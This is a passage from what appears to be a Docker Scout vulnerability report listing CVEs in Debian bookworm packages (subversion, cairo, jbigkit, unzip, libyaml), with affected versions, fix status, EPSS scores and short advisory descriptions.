<a href="https://scout.docker.com/v/CVE-2024-46901?s=debian&n=subversion&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.14.2-4%2Bdeb12u1"><img alt="low : CVE--2024--46901" src="https://img.shields.io/badge/CVE--2024--46901-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.14.2-4+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.14.2-4+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>7.256%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>91st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Insufficient validation of filenames against control characters in Apache Subversion repositories served via mod_dav_svn allows authenticated users with commit access to commit a corrupted revision, leading to disruption for users of the repository.  All versions of Subversion up to and including Subversion 1.14.4 are affected if serving repositories via mod_dav_svn. Users are recommended to upgrade to version 1.14.5, which fixes this issue.  Repositories served via other access methods are not affected.

---
- subversion 1.14.5-1
[bookworm] - subversion 1.14.2-4+deb12u1
https://subversion.apache.org/security/CVE-2024-46901-advisory.txt

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>cairo</strong> <code>1.16.0-7</code> (deb)</summary>

<small><code>pkg:deb/debian/cairo@1.16.0-7?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2018-18064?s=debian&n=cairo&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1.16.0-7"><img alt="low : CVE--2018--18064" src="https://img.shields.io/badge/CVE--2018--18064-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1.16.0-7</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.510%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>66th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

cairo through 1.15.14 has an out-of-bounds stack-memory write during processing of a crafted document by WebKitGTK+ because of the interaction between cairo-rectangular-scan-converter.c (the generate and render_rows functions) and cairo-image-compositor.c (the _cairo_image_spans_and_zero function).

---
- cairo <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=916083)
https://gitlab.freedesktop.org/cairo/cairo/issues/341
Negligible security impact

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>jbigkit</strong> <code>2.1-6.1</code> (deb)</summary>

<small><code>pkg:deb/debian/jbigkit@2.1-6.1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2017-9937?s=debian&n=jbigkit&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.1-6.1"><img alt="low : CVE--2017--9937" src="https://img.shields.io/badge/CVE--2017--9937-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.1-6.1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.868%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>75th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In LibTIFF 4.0.8, there is a memory malloc failure in tif_jbig.c. A crafted TIFF document can lead to an abort resulting in a remote denial of service attack.

---
- jbigkit <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=869708)
http://bugzilla.maptools.org/show_bug.cgi?id=2707
The CVE was assigned for src:tiff by MITRE, but the issue actually lies
in jbigkit itself.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>unzip</strong> <code>6.0-28</code> (deb)</summary>

<small><code>pkg:deb/debian/unzip@6.0-28?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2021-4217?s=debian&n=unzip&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D6.0-28"><img alt="low : CVE--2021--4217" src="https://img.shields.io/badge/CVE--2021--4217-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=6.0-28</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.173%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>39th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in unzip. The vulnerability occurs due to improper handling of Unicode strings, which can lead to a null pointer dereference. This flaw allows an attacker to input a specially crafted zip file, leading to a crash or code execution.

---
- unzip <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2044583
https://bugs.launchpad.net/ubuntu/+source/unzip/+bug/1957077
Crash in CLI tool, no security impact

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <img alt="unspecified: 2" src="https://img.shields.io/badge/U-2-lightgrey"/><strong>libyaml</strong> <code>0.2.5-1</code> (deb)</summary>

<small><code>pkg:deb/debian/libyaml@0.2.5-1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-35329?s=debian&n=libyaml&ns=debian&t=deb&osn=debian&osv=12&vr=%3E%3D0.2.5-1"><img alt="unspecified : CVE--2024--35329" src="https://img.shields.io/badge/CVE--2024--35329-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0.2.5-1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.043%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libyaml 0.2.5 is vulnerable to a heap-based Buffer Overflow in yaml_document_add_sequence in api.c.

---
REJECTED

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-3205?s=debian&n=libyaml&ns=debian&t=deb&osn=debian&osv=12&vr=%3E%3D0.2.5-1"><img alt="unspecified : CVE--2024--3205" src="https://img.shields.io/badge/CVE--2024--3205-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0.2.5-1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.043%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in yaml libyaml up to 0.2.5 and classified as critical. Affected by this issue is the function yaml_emitter_emit_flow_sequence_item of the file /src/libyaml/src/emitter.c. The manipulation leads to heap-based buffer overflow. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-259052. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.

---
REJECTED

</blockquote>
</details>
</details></td></tr>
</table>

